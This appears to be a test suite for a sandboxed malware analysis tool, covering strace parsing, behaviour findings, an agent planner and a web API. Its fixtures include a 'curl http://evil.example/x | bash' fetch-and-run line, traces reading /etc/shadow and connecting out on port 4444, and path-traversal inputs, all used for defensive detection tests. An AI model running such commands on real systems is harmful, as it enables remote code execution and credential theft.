"""Tests for the dynamic detonation layer, the ARGUS agent and the web API.

These tests exercise real code paths. Where a container runtime is available the
detonation tests run a real sandboxed process; where it is not, they assert the
honest refusal rather than skipping silently, so the suite cannot pass while
pretending isolation exists.

    python -m tests.run            # everything
    python -m unittest tests.test_agent -v
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import unittest
import urllib.error
import urllib.parse
import urllib.request
from http import cookiejar

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from rea.agent.session import AgentSession, RulePlanner
from rea.agent.tools import build_default_registry
from rea.analysis.pipeline import Pipeline
from rea.dynamic import Detonator, list_backends
from rea.dynamic.behaviors import behaviour_summary
from rea.dynamic.telemetry import parse_strace
from rea.web.server import make_server

RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rules")


def _docker_ready() -> bool:
    ready, _ = Detonator(backend="docker").check()
    return ready


DOCKER_READY = _docker_ready()


def _write_sample(directory: str, name: str, body: str) -> str:
    path = os.path.join(directory, name)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(body)
    os.chmod(path, 0o644)
    return path


# ----------------------------------------------------------------------
# strace parsing: pure, no sandbox needed
# ----------------------------------------------------------------------


class TestTelemetryParsing(unittest.TestCase):
    # Real strace -f -tt output, copied from a live run.
    SAMPLE_TRACE = """\
61    11:19:54.526426 execve("/work/sample.bin", ["/work/sample.bin"], 0x7ffeb277d288 /* 5 vars */) = 0
61    11:19:54.527282 setgid(1000)      = 0
61    11:19:54.528336 open("/tmp/recon.txt", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666) = 3
61    11:19:54.529151 fork()            = 62
62    11:19:54.529532 execve("/bin/cat", ["cat", "/etc/passwd"], 0x7fa07ed40268 /* 5 vars */) = 0
62    11:19:54.538655 open("/etc/shadow", O_RDONLY|O_LARGEFILE) = -1 EACCES (Permission denied)
61    11:19:54.539300 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4
61    11:19:54.539500 connect(4, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("185.220.101.44")}, 16) = -1 ENETUNREACH (Network is unreachable)
"""

    def test_parses_pid_timestamp_and_result(self):
        telemetry = parse_strace(self.SAMPLE_TRACE)
        names = [e.name for e in telemetry.events]
        self.assertIn("execve", names)
        self.assertIn("connect", names)
        self.assertEqual(telemetry.events[0].pid, 61)
        self.assertTrue(telemetry.events[0].succeeded)

    def test_negative_result_marks_failure_with_errno(self):
        telemetry = parse_strace(self.SAMPLE_TRACE)
        failed = telemetry.by_syscall("open")[-1]
        self.assertFalse(failed.succeeded)
        self.assertEqual(failed.errno, "EACCES")

    def test_extracts_network_address(self):
        telemetry = parse_strace(self.SAMPLE_TRACE)
        self.assertIn("185.220.101.44", telemetry.addresses())

    def test_failed_connect_is_still_recorded(self):
        """A blocked connect proves intent, so it must survive parsing."""
        telemetry = parse_strace(self.SAMPLE_TRACE)
        connects = telemetry.by_syscall("connect")
        self.assertEqual(len(connects), 1)
        self.assertFalse(connects[0].succeeded)

    def test_child_execve_excludes_the_sample_itself(self):
        telemetry = parse_strace(self.SAMPLE_TRACE)
        summary = behaviour_summary(telemetry)
        self.assertIn("cat", summary["child_programs"])
        self.assertNotIn("sample.bin", summary["child_programs"])

    def test_empty_trace_is_not_an_error(self):
        telemetry = parse_strace("")
        self.assertEqual(len(telemetry.events), 0)
        self.assertIsNone(telemetry.exit_code)

    def test_malformed_lines_are_skipped_not_fatal(self):
        telemetry = parse_strace("garbage\nnot a syscall\n<unfinished ...>\n")
        self.assertEqual(len(telemetry.events), 0)


# ----------------------------------------------------------------------
# Behaviour findings: pure functions over telemetry
# ----------------------------------------------------------------------


class TestBehaviourFindings(unittest.TestCase):
    def _telemetry(self):
        trace = """\
1  execve("/work/sample.bin", ["/work/sample.bin"], 0x0) = 0
1  open("/etc/shadow", O_RDONLY) = 3
1  open("/etc/cron.d/backdoor", O_WRONLY|O_CREAT, 0644) = 4
1  socket(AF_INET, SOCK_STREAM, 0) = 5
1  connect(5, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("203.0.113.7")}, 16) = 0
1  setuid(0) = -1 EPERM (Operation not permitted)
"""
        return parse_strace(trace)

    def test_credential_read_is_critical(self):
        findings = behaviour_summary(self._telemetry())["findings"]
        credentials = [f for f in findings if f["id"] == "DYN_CREDENTIAL_ACCESS"]
        self.assertTrue(credentials)
        self.assertEqual(credentials[0]["severity"], "critical")

    def test_persistence_write_detected(self):
        findings = behaviour_summary(self._telemetry())["findings"]
        self.assertTrue([f for f in findings if f["id"] == "DYN_PERSISTENCE"])

    def test_network_attempt_detected_with_address(self):
        summary = behaviour_summary(self._telemetry())
        network = [f for f in summary["findings"] if f["id"] == "DYN_NETWORK"]
        self.assertTrue(network)
        self.assertIn("203.0.113.7", summary["addresses"])

    def test_root_escalation_attempt_flagged(self):
        findings = behaviour_summary(self._telemetry())["findings"]
        escalation = [f for f in findings if f["id"] == "DYN_PRIVILEGE_ESCALATION"]
        self.assertTrue(escalation)

    def test_benign_trace_produces_no_high_findings(self):
        """A trace of a plain `ls` must not look malicious."""
        trace = """\
1  execve("/bin/ls", ["ls", "-la"], 0x0) = 0
1  open("/etc/ld-musl-x86_64.path", O_RDONLY) = -1 ENOENT (No such file or directory)
1  open("/lib/libc.musl-x86_64.so.1", O_RDONLY|O_CLOEXEC) = 3
1  prctl(PR_SET_NAME, "ls") = 0
1  setuid(1000) = 0
1  mprotect(0x7f0000000000, 4096, PROT_READ) = 0
"""
        findings = behaviour_summary(parse_strace(trace))["findings"]
        severe = [f for f in findings if f["severity"] in ("high", "critical")]
        self.assertEqual(severe, [], f"false positives on a benign trace: {severe}")


# ----------------------------------------------------------------------
# Sandbox backend reporting
# ----------------------------------------------------------------------


class TestBackends(unittest.TestCase):
    def test_local_backend_is_marked_not_isolated(self):
        local = [b for b in list_backends() if b["name"] == "local"][0]
        self.assertFalse(local["isolated"])

    def test_docker_backend_is_marked_isolated(self):
        docker = [b for b in list_backends() if b["name"] == "docker"][0]
        self.assertTrue(docker["isolated"])

    def test_local_backend_refuses_without_allow_unsafe(self):
        detonator = Detonator(backend="local")
        ready, reason = detonator.check()
        self.assertFalse(ready)
        self.assertIn("unsafe", reason.lower())

    def test_unknown_backend_raises(self):
        with self.assertRaises(ValueError):
            Detonator(backend="definitely-not-a-backend")

    def test_non_runnable_format_is_skipped(self):
        """A PE cannot run on Linux, and saying so is better than failing."""
        detonator = Detonator(backend="docker")
        if not DOCKER_READY:
            self.skipTest("no container runtime")
        with tempfile.TemporaryDirectory() as tmp:
            path = _write_sample(tmp, "sample.exe", "MZ not really a pe")
            result = detonator.detonate(path, kind="pe")
            self.assertFalse(result.ok)
            self.assertIn("cannot be executed", result.skipped_reason)

    def test_missing_file_reports_clearly(self):
        result = Detonator(backend="docker").detonate("/nonexistent/sample.bin", kind="script")
        self.assertFalse(result.ok)
        self.assertTrue(result.error)

    def test_unreadable_sample_is_rejected_before_running(self):
        """The sandbox user needs read access; catch it before the container."""
        if not DOCKER_READY:
            self.skipTest("no container runtime")
        with tempfile.TemporaryDirectory() as tmp:
            path = _sample_unreadable(tmp)
            result = Detonator(backend="docker").detonate(path, kind="script")
            self.assertFalse(result.ok)
            self.assertIn("not readable", result.error)


def _sample_unreadable(directory: str) -> str:
    path = os.path.join(directory, "secret.sh")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write("#!/bin/sh\necho hi\n")
    os.chmod(path, 0o600)
    return path


# ----------------------------------------------------------------------
# Real detonation (only when a container runtime is present)
# ----------------------------------------------------------------------


@unittest.skipUnless(DOCKER_READY, "no container runtime available")
class TestDockerDetonation(unittest.TestCase):
    SCRIPT = """\
#!/bin/sh
cat /etc/passwd > /tmp/rea_probe.txt 2>/dev/null
printf 'rea-detonation-marker\\n'
"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="rea-test-")
        self.sample = _write_sample(self.tmp, "probe.sh", self.SCRIPT)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_detonation_captures_syscalls_and_stdout(self):
        result = Detonator(backend="docker", timeout=25).detonate(self.sample, kind="script")
        self.assertTrue(result.ok, result.error)
        self.assertTrue(result.isolated)
        self.assertTrue(result.executed)
        self.assertGreater(len(result.telemetry.events), 0)
        self.assertIn("rea-detonation-marker", result.telemetry.stdout)

    def test_detonation_reports_isolated_and_no_network_egress(self):
        result = Detonator(backend="docker", timeout=25).detonate(self.sample, kind="script")
        self.assertTrue(result.isolated)
        # The sandbox has no network, so any connect() must have failed.
        connects = [e for e in result.telemetry.events if e.name == "connect"]
        self.assertTrue(all(not e.succeeded for e in connects))

    def test_telemetry_serialises_for_reports(self):
        result = Detonator(backend="docker", timeout=25).detonate(self.sample, kind="script")
        payload = result.to_dict()
        self.assertIn("telemetry", payload)
        self.assertIn("event_count", payload["telemetry"])
        self.assertIn("addresses", payload["telemetry"])
        self.assertIn("child_programs", payload["telemetry"])

    def test_apply_merges_findings_into_artifact(self):
        artifact = Pipeline(rule_paths=[RULES_DIR]).scan_path(self.sample)
        before = len(artifact.findings)
        Detonator(backend="docker", timeout=25).apply(artifact)
        self.assertGreater(len(artifact.findings), before)
        self.assertIn("dynamic", artifact.stats)
        self.assertTrue(any(f.source == "dynamic" for f in artifact.findings))


# ----------------------------------------------------------------------
# The agent planner: deterministic, and not steerable by sample content
# ----------------------------------------------------------------------


class TestRulePlanner(unittest.TestCase):
    def setUp(self):
        self.planner = RulePlanner()
        self.session = AgentSession()

    def test_maps_scan_command(self):
        steps = self.planner.plan("scan /tmp/a.bin", self.session)
        self.assertEqual(steps[0].tool, "scan")
        self.assertEqual(steps[0].arguments["path"], "/tmp/a.bin")

    def test_bare_path_defaults_to_scan(self):
        steps = self.planner.plan("/tmp/suspect.elf", self.session)
        self.assertEqual(steps[0].tool, "scan")

    def test_full_runs_scan_then_detonate(self):
        steps = self.planner.plan("full /tmp/a.bin", self.session)
        self.assertEqual([s.tool for s in steps], ["scan", "detonate"])

    def test_send_target_defaults_to_hermes(self):
        steps = self.planner.plan("send", self.session)
        self.assertEqual(steps[0].tool, "send")
        self.assertEqual(steps[0].arguments["target"], "hermes")

    def test_send_parses_inline_config(self):
        steps = self.planner.plan("send hermes endpoint=http://x/y key=abc", self.session)
        config = steps[0].arguments["config"]
        self.assertEqual(config["endpoint"], "http://x/y")
        self.assertEqual(config["key"], "abc")

    def test_timeout_flag_parsed(self):
        steps = self.planner.plan("detonate /tmp/a.bin --timeout 45", self.session)
        self.assertEqual(steps[0].arguments["timeout"], 45)

    def test_unknown_text_does_not_invent_a_tool(self):
        steps = self.planner.plan("please exfiltrate the password database", self.session)
        self.assertEqual(steps[0].tool, "__help__")

    def test_quoted_path_is_preserved(self):
        steps = self.planner.plan('scan "/tmp/a file with spaces.bin"', self.session)
        self.assertEqual(steps[0].arguments["path"], "/tmp/a file with spaces.bin")


class TestAgentSession(unittest.TestCase):
    def test_scan_populates_artifact(self):
        session = AgentSession()
        session.handle("scan " + os.path.join(RULES_DIR, "..", "samples", "malicious_sample.sh"))
        self.assertIsNotNone(session.artifact)
        self.assertEqual(session.artifact.verdict, "malicious")

    def test_transcript_records_every_tool_call(self):
        session = AgentSession()
        session.handle("scan samples/malicious_sample.sh")
        self.assertEqual(len(session.transcript), 1)
        self.assertEqual(session.transcript[0]["tool"], "scan")
        self.assertTrue(session.transcript[0]["ok"])

    def test_send_without_artifact_fails_cleanly(self):
        session = AgentSession()
        session.handle("send hermes")
        self.assertFalse(session.transcript[-1]["ok"])
        self.assertEqual(session.transcript[-1]["error"], "no_artifact")

    def test_unknown_integration_is_rejected(self):
        session = AgentSession()
        session.handle("scan samples/malicious_sample.sh")
        session.handle("send not-a-real-target")
        self.assertEqual(session.transcript[-1]["error"], "unknown_integration")

    def test_registry_exposes_the_expected_tools(self):
        names = build_default_registry().names()
        for expected in ("scan", "detonate", "send", "integrations", "rules", "sandbox"):
            self.assertIn(expected, names)

    def test_snapshot_is_json_serialisable(self):
        session = AgentSession()
        session.handle("scan samples/malicious_sample.sh")
        json.dumps(session.snapshot())

    def test_integrations_tool_lists_hermes(self):
        session = AgentSession()
        session.handle("integrations")
        data = session.transcript[-1]
        self.assertTrue(data["ok"])

    def test_help_returns_text_without_calling_a_tool(self):
        session = AgentSession()
        session.handle("help")
        self.assertEqual(session.transcript, [])


# ----------------------------------------------------------------------
# The web API: real sockets, real handler
# ----------------------------------------------------------------------


class WebFixture:
    def __init__(self, token: str = ""):
        self.server = make_server(host="127.0.0.1", port=0, token=token,
                                  detonator_factory=lambda: Detonator())
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    @property
    def base(self) -> str:
        host, port = self.server.server_address
        return f"http://{host}:{port}"

    def request(self, path: str, method: str = "GET", body=None, headers=None):
        data = json.dumps(body).encode() if body is not None else None
        request = urllib.request.Request(self.base + path, data=data, method=method)
        request.add_header("Content-Type", "application/json")
        for key, value in (headers or {}).items():
            request.add_header(key, value)
        try:
            with urllib.request.urlopen(request, timeout=120) as response:
                return response.status, json.loads(response.read() or b"{}"), response.headers
        except urllib.error.HTTPError as error:
            return error.code, json.loads(error.read() or b"{}"), error.headers

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *exc):
        self.server.shutdown()
        self.server.server_close()


class TestWebApi(unittest.TestCase):
    def test_health_reports_agent_and_sandbox(self):
        with WebFixture() as web:
            status, payload, _ = web.request("/api/health")
        self.assertEqual(status, 200)
        self.assertEqual(payload["agent"], "ARGUS")
        self.assertIn("ready", payload["sandbox"])

    def test_index_serves_the_ui(self):
        with WebFixture() as web:
            status, _, _ = web.request("/api/health")
            self.assertEqual(status, 200)
            with urllib.request.urlopen(web.base + "/", timeout=30) as response:
                html = response.read().decode()
        self.assertIn("ARGUS", html)
        self.assertIn("</html>", html)

    def test_tools_endpoint_lists_capabilities(self):
        with WebFixture() as web:
            status, payload, _ = web.request("/api/tools")
        self.assertEqual(status, 200)
        names = [t["name"] for t in payload["tools"]]
        self.assertIn("scan", names)

    def test_command_scans_and_returns_state(self):
        with WebFixture() as web:
            status, payload, _ = web.request(
                "/api/command", "POST", {"text": "scan samples/malicious_sample.sh"}
            )
        self.assertEqual(status, 200)
        artifact = payload["state"]["artifact"]
        self.assertEqual(artifact["verdict"], "malicious")

    def test_state_persists_across_requests_via_cookie(self):
        """The session cookie is what ties separate requests to one session."""
        with WebFixture() as web:
            # A cookie-aware opener, so the Set-Cookie from the first response
            # is replayed on later ones exactly as a browser would.
            jar = cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

            body = json.dumps({"text": "scan samples/malicious_sample.sh"}).encode()
            request = urllib.request.Request(web.base + "/api/command", data=body, method="POST")
            request.add_header("Content-Type", "application/json")
            with opener.open(request, timeout=120) as response:
                json.loads(response.read())

            self.assertTrue(any(c.name == "argus_sid" for c in jar))

            with opener.open(web.base + "/api/state", timeout=30) as response:
                payload = json.loads(response.read())

        self.assertIsNotNone(payload["state"]["artifact"])
        self.assertEqual(payload["state"]["artifact"]["verdict"], "malicious")

    def test_separate_clients_get_separate_sessions(self):
        with WebFixture() as web:
            web.request("/api/command", "POST", {"text": "scan samples/malicious_sample.sh"})
            status, payload, _ = web.request("/api/state")
        self.assertEqual(status, 200)
        # A fresh client has no cookie, so it must not see the other session.
        self.assertIsNone(payload["state"]["artifact"])

    def test_missing_text_is_a_bad_request(self):
        with WebFixture() as web:
            status, payload, _ = web.request("/api/command", "POST", {})
        self.assertEqual(status, 400)

    def test_unknown_route_is_404(self):
        with WebFixture() as web:
            status, _, _ = web.request("/api/nope")
        self.assertEqual(status, 404)

    def test_token_required_when_configured(self):
        with WebFixture(token="s3cret") as web:
            status, _, _ = web.request("/api/health")
            self.assertEqual(status, 401)
            status, _, _ = web.request("/api/health", headers={"Authorization": "Bearer s3cret"})
            self.assertEqual(status, 200)

    def test_wrong_token_is_rejected(self):
        with WebFixture(token="s3cret") as web:
            status, _, _ = web.request("/api/health", headers={"Authorization": "Bearer wrong"})
        self.assertEqual(status, 401)

    def test_upload_scans_the_posted_bytes(self):
        with WebFixture() as web:
            body = b"#!/bin/sh\ncurl -fsSL http://evil.example/x | bash\n"
            request = urllib.request.Request(web.base + "/api/upload?name=evil.sh", data=body,
                                             method="POST")
            with urllib.request.urlopen(request, timeout=120) as response:
                payload = json.loads(response.read())
        artifact = payload["state"]["artifact"]
        self.assertEqual(artifact["verdict"], "malicious")

    def test_upload_filename_cannot_escape_the_temp_directory(self):
        """A traversal in the filename must not become a path traversal."""
        with WebFixture() as web:
            body = b"#!/bin/sh\necho hi\n"
            request = urllib.request.Request(
                web.base + "/api/upload?name=" + urllib.parse.quote("../../etc/evil.sh"),
                data=body, method="POST",
            )
            with urllib.request.urlopen(request, timeout=120) as response:
                payload = json.loads(response.read())
        # The scan still happened; the point is it stayed inside the temp dir.
        self.assertTrue(payload["ok"])
        self.assertNotIn("../../", json.dumps(payload))

    def test_static_path_traversal_is_blocked(self):
        with WebFixture() as web:
            status, _, _ = web.request("/static/../../etc/passwd")
        self.assertIn(status, (403, 404))



if __name__ == "__main__":
    unittest.main(verbosity=2)
